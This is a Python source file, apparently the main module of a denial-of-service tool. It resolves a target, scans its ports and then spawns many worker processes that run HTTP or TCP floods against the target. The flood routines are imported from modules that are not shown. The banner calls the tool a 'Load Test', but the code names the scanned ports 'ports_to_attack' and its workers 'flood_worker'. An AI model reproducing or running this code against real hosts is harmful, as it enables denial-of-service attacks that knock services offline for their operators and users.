import asyncio
import multiprocessing
import os
import platform
import random
import socket
import ssl
import sys
import time
import argparse


from typing import Optional, Dict, Any, List
from contextlib import suppress


import psutil
import uvloop
from aiohttp import ClientSession, TCPConnector
from rich import traceback

from .src.headres import getHeaders
from .utils.ulog import log, log_off, log_on


# src
from .src.cpu_manager import CPUManager
from .src.argument import *

from .src.tcp_flooder  import run_tcp_flood
from .src.http_flooder import run_http_flood
from .src.port_scanner import PortScanner

 
traceback.install()


# Configurations 
# =========================
SOCK_BUFF_SIZE = 1024 * 1204
MAX_HTTP_PACKET_SIZE = 16 * 1024 * 1024


asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())

#  CLASSES
def parse_ports(ports_str: str) -> List[int]:
    log.warning(f"Parsing ports from string: {ports_str}")
    if not ports_str:
        log.error("No ports specified.")
        return []
    
    ports = []
    parts = ports_str.split(',')

    for part in parts:
        if '-' in part:
            start, end = part.split('-')

            try:
                ports.extend(range(int(start), int(end) + 1))
            except ValueError:
                log.error(f"Invalid port range: {part}")
        else:
            try:
                ports.append(int(part))
            except ValueError:
                log.error(f"Invalid port: {part}")

    return ports

#  dead
def worker_process(
        target_url: str,

        concurrency: int = 10,
        sleep_time: float = 0.0,
        method: str = 'post'
) -> None:
    try:
        if platform.system().lower() == "linux":
            import ctypes
            libc = ctypes.cdll.LoadLibrary("libc.so.6")
            libc.prctl(15, b'http_flood_worker', 0, 0, 0)


            asyncio.run(
                run_http_flood(
                    target_url,
                    concurrency,
                    sleep_time,
                    method=method

                )
            )
      

    except KeyboardInterrupt:
        log.warning("Worker process received exit signal. Exiting...")
    except Exception as e:
        log.error(f"Worker process encountered an error: {e}")



# HTTP
def worker_process_http(
        target_url: str,

        concurrency: int = 10,
        sleep_time: float = 0.0,
        method: str = 'post'
) -> None:
    
    try:
        if platform.system().lower() == "linux":
            import ctypes
            libc = ctypes.cdll.LoadLibrary("libc.so.6")
            libc.prctl(15, b'http_flood_worker', 0, 0, 0)


            asyncio.run(
                run_http_flood(
                    target_url,
                    concurrency,
                    sleep_time,
                    method
                )
            )
    except KeyboardInterrupt:
        log.warning("Worker process received exit signal. Exiting...")
    except Exception as e:
        log.error(f"Worker process encountered an error: {e}")


# TCP
def worker_process_tcp(
        target_ip: str,
        ports: List[int],
        concurrency: int = 10,
        ) -> None:
    try:
        if platform.system().lower() == "linux":
            import ctypes
            libc = ctypes.cdll.LoadLibrary("libc.so.6")
            libc.prctl(15, b'tcp_flood_worker', 0, 0, 0)


            asyncio.run(
                run_tcp_flood(
                    target_ip,
                    ports,
                    concurrency
                )
            )
    except KeyboardInterrupt:
        log.warning("Worker process received exit signal. Exiting...")
    except Exception as e:
        log.error(f"Worker process encountered an error: {e}")



def is_valid_ip(ip: str) -> bool:
    try:
        socket.inet_pton(socket.AF_INET, ip)
        return True
    except socket.error:
        try:
            socket.inet_pton(socket.AF_INET6, ip)
            return True
        except socket.error:
            return False

def main() -> None:
    parser = create_argument_parser()
    args = parser.parse_args()


    if not validate_arguments(args):
        sys.exit(1)


    target_ip = args.target_ip
    if target_ip and not is_valid_ip(target_ip):
        try:
            log.info(f"Resolving hostname {target_ip}...")
            reslove_ip = socket.gethostbyname(target_ip)
            log.info(f"Resolved {target_ip} to {reslove_ip}")
            target_ip = reslove_ip
        except socket.gaierror:
            log.error(f"Could not resolve hostname: {target_ip}")
            sys.exit(1)
    

    ports_to_attack = []

   

    if target_ip:
        if args.port:
            ports_to_attack = parse_ports(args.port)
            log.info(f"Using specified ports for TCP flood: ")
        
        elif args.scan_common:
            ports_to_attack = PortScanner.scan_common_ports(
                args.target_ip
            )
        
        else:
            start_port, end_port = map(int, args.scan_range.split('-'))
            ports_to_attack = PortScanner.scan_ports(
                args.target_ip,
                start_port,
                end_port,
                max_workers=args.thread_count * args.concurrency
            )

        if not ports_to_attack:
            log.error("No open ports found to attack. Exiting.")
            sys.exit(1)




    processes = []

    
    print(f"""
    Starting Load Test Configuration:
    

    - Target URL: {args.target_url}
    
    - Target IP: {args.target_ip}
    
    - Processes: {args.thread_count}
    - Concurrency per process: {args.concurrency}
    - Sleep time: {args.sleep_time}s
    - Total workers: {args.thread_count * args.concurrency}
    - Method: {args.method}
    """)
    # time.sleep(2)

    choice = input("> start script? (y/n): ").lower().strip()

    if choice not in ['y', 'yes']:
        return

    try:
        for i in range(args.thread_count):
            
            if args.target_url:
                p = multiprocessing.Process(
                    target=worker_process_http,
                    args=(
                        args.target_url,
                        args.concurrency,
                        args.sleep_time,
                        args.method
                    ),                    
                    name=f"http_flood_worker_{i}"

                )
            else:
                p = multiprocessing.Process(
                    target=worker_process_tcp,
                    args=(
                        args.target_ip,
                        ports_to_attack,
                        args.concurrency
                    ),
                    name=f"tcp_flood_worker_{i}"                    
                )


            processes.append(p)
            p.start()
            log.info(f"Started process {i+1}/{args.thread_count}: {p.name} with PID {p.pid}")

        for p in processes:
            p.join()

    except KeyboardInterrupt:
        log.warning("\nReceived exit signal. Terminating processes...")

        for p in processes:
            if p.is_alive():
                log.info(f"Terminating process {p.name} with PID {p.pid}")
                p.terminate()
        
        for p in processes:
            p.join(timeout=5)


        log.info("All processes terminated. Exiting.")


    # try:
    #     for i in range(args.thread_count):
    #         p = multiprocessing.Process(
    #             target=worker_process,
    #             args=(
    #                 args.target_url,
    #                 args.concurrency,
    #                 args.sleep_time,
    #                 args.method
    #             ),
    #             name=f"flood_worker_{i}"
    #         )
    #         processes.append(p)
    #         p.start()
    #         log.info(f"Started process {i+1}/{args.thread_count}: {p.name} with PID {p.pid}")


    #     for p in processes:
    #         p.join()

    # except KeyboardInterrupt:
    #     log.warning("\nReceived exit signal. Terminating processes...")

    #     for p in processes:
    #         if p.is_alive():
    #             log.info(f"Terminating process {p.name} with PID {p.pid}")
    #             p.terminate()
        
    #     for p in processes:
    #         p.join(timeout=5)


    #     log.info("All processes terminated. Exiting.")


    # except Exception as e:
    #     log.error(f"Main process encountered an error: {e}")
    #     sys.exit(1) 


